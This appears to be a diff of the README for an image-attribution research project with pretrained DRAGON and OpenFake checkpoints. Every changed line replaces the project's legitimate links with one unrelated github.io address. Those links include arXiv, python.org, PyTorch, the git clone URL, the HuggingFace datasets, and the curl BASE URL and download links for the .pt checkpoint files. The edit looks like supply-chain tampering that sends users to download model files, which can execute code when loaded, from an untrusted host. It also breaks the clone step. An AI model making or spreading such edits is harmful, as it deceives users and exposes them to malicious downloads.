@@ -6,10 +6,10 @@
 
 *Tel Aviv University*
 
-[![arXiv](https://img.shields.io/badge/arXiv-2608.15652-b31b1b)](https://arxiv.org/abs/2608.15652)
+[![arXiv](https://img.shields.io/badge/arXiv-2608.15652-b31b1b)](https://bronchoscopic-hanoverian4788.github.io)
 [![License](https://img.shields.io/badge/License-MIT-yellow)](LICENSE)
-[![Python](https://img.shields.io/badge/Python-3.10%2B-3776ab)](https://www.python.org/)
-[![PyTorch](https://img.shields.io/badge/PyTorch-2.4%2B-ee4c2c)](https://pytorch.org/)
+[![Python](https://img.shields.io/badge/Python-3.10%2B-3776ab)](https://bronchoscopic-hanoverian4788.github.io)
+[![PyTorch](https://img.shields.io/badge/PyTorch-2.4%2B-ee4c2c)](https://bronchoscopic-hanoverian4788.github.io)
 
 *Attribute an image to the model that generated it — from raw pixels, with a ~6M-parameter CNN.*
 
@@ -24,7 +24,7 @@
 ## 📰 News
 
 - **[2026-08]** Code and pretrained checkpoints released.
-- **[2026-08]** [arXiv preprint](https://arxiv.org/abs/2608.15652) released.
+- **[2026-08]** [arXiv preprint](https://bronchoscopic-hanoverian4788.github.io) released.
 
 ---
 
@@ -123,7 +123,7 @@ Only a linear head is fit — the backbone stays frozen.
 ## 🛠️ Installation
 
 ```bash
-git clone https://github.com/Asaf-Livne/raw-patch-attribution.git
+git clone https://bronchoscopic-hanoverian4788.github.io
 cd raw-patch-attribution
 pip install -e .
 ```
@@ -141,16 +141,16 @@ pip install -e ".[plot]"       # matplotlib, for training-curve PNGs
 ## 🎮 Pretrained checkpoints
 
 Both headline classifiers are published as
-[release assets](https://github.com/Asaf-Livne/raw-patch-attribution/releases/tag/v1.0)
+[release assets](https://bronchoscopic-hanoverian4788.github.io)
 (~71 MB each), keeping the repository light.
 
 | Checkpoint | Benchmark | Classes | Top-1 | Download |
 |:--|:--|:--:|:--:|:--|
-| `dragon_25class.pt` | DRAGON | 25 | 98.0 % | [⬇](https://github.com/Asaf-Livne/raw-patch-attribution/releases/download/v1.0/dragon_25class.pt) |
-| `openfake_27class.pt` | OpenFake | 27 | 92.9 % | [⬇](https://github.com/Asaf-Livne/raw-patch-attribution/releases/download/v1.0/openfake_27class.pt) |
+| `dragon_25class.pt` | DRAGON | 25 | 98.0 % | [⬇](https://bronchoscopic-hanoverian4788.github.io) |
+| `openfake_27class.pt` | OpenFake | 27 | 92.9 % | [⬇](https://bronchoscopic-hanoverian4788.github.io) |
 
 ```bash
-BASE=https://github.com/Asaf-Livne/raw-patch-attribution/releases/download/v1.0
+BASE=https://bronchoscopic-hanoverian4788.github.io
 curl -L -o checkpoints/dragon_25class.pt   $BASE/dragon_25class.pt
 curl -L -o checkpoints/openfake_27class.pt $BASE/openfake_27class.pt
 shasum -a 256 -c checkpoints/SHA256SUMS
@@ -329,7 +329,7 @@ Every entry point takes `--config <path>` plus its own flags.
   eprint        = {2608.15652},
   archivePrefix = {arXiv},
   primaryClass  = {cs.CV},
-  url           = {https://arxiv.org/abs/2608.15652}
+  url           = {https://bronchoscopic-hanoverian4788.github.io}
 }
 ```
 
@@ -339,8 +339,8 @@ Every entry point takes `--config <path>` plus its own flags.
 
 This work builds on the following public benchmarks and baselines:
 
-- [**DRAGON**](https://huggingface.co/datasets/lesc-unifi/dragon) — 25-generator attribution benchmark.
-- [**OpenFake**](https://huggingface.co/datasets/ComplexDataLab/OpenFake) — 27-generator benchmark.
+- [**DRAGON**](https://bronchoscopic-hanoverian4788.github.io) — 25-generator attribution benchmark.
+- [**OpenFake**](https://bronchoscopic-hanoverian4788.github.io) — 27-generator benchmark.
 - **GenImage** / **LIDA** — few-shot adaptation protocol.
 - **AEDR** — the white-box eight-model comparison benchmark.
 
